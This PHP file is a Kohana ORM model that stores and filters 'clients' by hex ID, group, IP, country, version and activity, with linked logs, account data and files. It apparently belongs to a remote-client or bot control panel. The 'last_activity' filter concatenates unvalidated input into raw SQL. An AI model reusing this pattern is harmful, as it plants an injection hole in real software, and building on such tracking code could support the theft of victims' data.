<?php defined('SYSPATH') or die('No direct script access.');

class Model_Client extends ORM {

    protected $_primary_key = 'id';
    protected $_table_columns = array(
        'id' => NULL,
        'id_low' => NULL,
        'id_high' => NULL,
        'name' => NULL,
        'group' => NULL,
        'ip' => NULL,
        'country' => NULL,
        'sys_ver' => NULL,
        'client_ver' => NULL,
        'created_at' => NULL,
        'logged_at' => NULL,
        'userdefined' => NULL,
        'last_activity' => NULL,
        'have_comment' => NULL,
    );

    protected $_has_one = array(
        'usersystem' => [
            'model' => 'UserSystem',
            'foreign_key' => 'clientid',
        ],
        'comments' => array(
            'model' => 'Client_Comment',
            'foreign_key' => 'clientid',
        ),
    );

    protected $_has_many = array(
        'logs' => array(
            'model' => 'Log',
            'foreign_key' => 'client_id',
        ),
        'vars' => array(
            'model' => 'Var',
            'foreign_key' => 'clientid',
            'far_key' => 'clientid',
        ),
        'datagenerals' => [
            'model' => 'Datageneral',
            'foreign_key' => 'client_id',
        ],
        'dataaccounts' => array(
            'model' => 'Dataaccount',
            'foreign_key' => 'clientid',
        ),
        'datafiles' => [
            'model' => 'Datafiles',
            'foreign_key' => 'client_id',
        ],
    );

    protected $errors;

    public function getErrors()
    {
        return $this->errors;
    }

    public function getDate($column){
        $date = new DateTime($this->{$column});
        return $date->format('Y-m-d H:i:s');
    }

    public function getLink(){
        if ( ! $this->id ){
            return '0';
        }

        return '<a class="btn-link" target="_blank" href="/log/' . $this->id . '">' . $this->getFullName() . '</a>';
    }

    public function getClientIDByName($clientName){
        if ( '0' == $clientName )
        {
            return 0;
        }

        $cid = Helper::getCid($clientName);

        $filter_client = DB::select()
            ->from('clients')
            ->where('id_low', '=', $cid[0])
            ->where('id_high', '=', $cid[1])
            ->execute()
            ->as_array();

        if(isset($filter_client[0]))
            return $filter_client[0]['id'];
        else
            return 0;
    }

    public function getClientID(){
        $base_length = 16;
        $name = null;
        if($this->id_high != 0){
            $lenght = strlen(dechex($this->id_high));
            if($lenght != $base_length){
                $delta = $base_length - $lenght;
                for($i = 0; $i < $delta; $i++){
                    $name .= '0';
                }
            }
            $name .= dechex($this->id_high);
        }
        if($this->id_low != 0){ // cid0
            $lenght = strlen(dechex($this->id_low));
            if($lenght != $base_length){
                $delta = $base_length - $lenght;
                for($i = 0; $i < $delta; $i++){
                    $name .= '0';
                }
            }
            $name .= dechex($this->id_low);
        }
        return mb_strtoupper($name);
    }

    public function getFullName(){
        if($this->loaded())
            return trim($this->name).'.'.$this->getClientID();
        return false;
    }

    public function selectByFilter($post, $user_id = false, $db=false) {
        $post = Arr::extract($post, [
            'name',
            'group',
            'ip',
            'start',
            'end',
            'last_activity',
            'have_comment',
            'country',
            'get_stat',
        ]);

        // TODO: add validation rules
        $validation = Validation::factory($post)
            ->label('name', 'Prefix')
            ->label('group', 'Group')
            ->label('ip', 'IP')

            ->label('start', 'Registered start')
            ->rule('start', 'regex', array(':value', '/^\d{4}\/\d{2}\/\d{2}$/'))

            ->label('end', 'Registered end')
            ->rule('end', 'regex', array(':value', '/^\d{4}\/\d{2}\/\d{2}$/'))

            ->label('last_activity', 'LastActivity')
            //TODO: add validation for lastactivity
            ->label('country', 'Country')
            //TODO: add validation for location
            ->label('get_stat', 'Get Stat?');

        if ( ! $validation->check() ) {
            $this->errors = $validation->errors('validation');

            return false;
        }

        if ( ! $db) {
            $clients = ORM::factory('Client');
        } else {
            $clients = $db;
        }
        if($user_id)
            $file_path_net_access = Kohana::find_file('net_access', $user_id, 'json');
        else{
            $file_path_net_access = false;
        }

        /* LAST ACTIVITY */
        if(isset($post['last_activity']) && $post['last_activity'] != '') {
            $clients->where('last_activity', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $post['last_activity'] . " MINUTE'"));
        }

        /* Have comments */
        if(isset($post['have_comment']) && ($post['have_comment'] != '' && $post['have_comment'] != '0' )) {
            if ( $post['have_comment'] == '1' ) { $clients->where('have_comment', '=', false); }
            else if ( $post['have_comment'] == '2' ) { $clients->where('have_comment', '=', true); }
        }

        /* country */
        if(Helper::issetAndNotEmpty($post['country'])) {
            $alpha_country = Kohana::$config->load('country')->as_array();
            foreach($post['country'] as $k => $v){
                if(strlen($v) == 2){
                    $keys = array_keys($alpha_country, $v);
                    foreach($keys as $key => $value){
                        if($key == 0) {
                            $post['country'][$k] = $value;
                        }else {
                            $post['country'][] = $value;
                        }
                    }
                }
            }

            $clients->where(
                'country', 'IN', $post['country']
            );
        }

        /* IP */
        if(Helper::issetAndNotEmpty($post['ip'])) {
            $clients->where(
                DB::expr('ip::text'), 'LIKE', '%'.trim($post['ip'].'%')
            );
        }

        /* created_at */
        if (Helper::issetAndNotEmpty($post['start'])) {
            $clients->where('created_at', '>=', $post['start'] . ' 00:00:00');
        }
        if (Helper::issetAndNotEmpty($post['end'])) {
            $clients->where('created_at', '<=', $post['end'] . ' 23:59:59');
        }

        /* GROUP */
        if (Helper::issetAndNotEmpty($post['group'])) {
            $clients->where('group', 'IN', $post['group']);
        }
        /* NET ACCESS */
        if ($file_path_net_access) {
            $net_list = json_decode(
                file_get_contents($file_path_net_access)
            );
            $clients->where('group', 'IN', $net_list);
        }

        /* Prefix */
        if (Helper::issetAndNotEmpty($post['name'])) {
            $clients->where('name', 'ILIKE', '%'.$post['name'].'%');
        }

        return $clients;
    }


    public function timeElapsed($column){
        return Helper::time_elapsed_string($this->{$column}, true);
    }
}
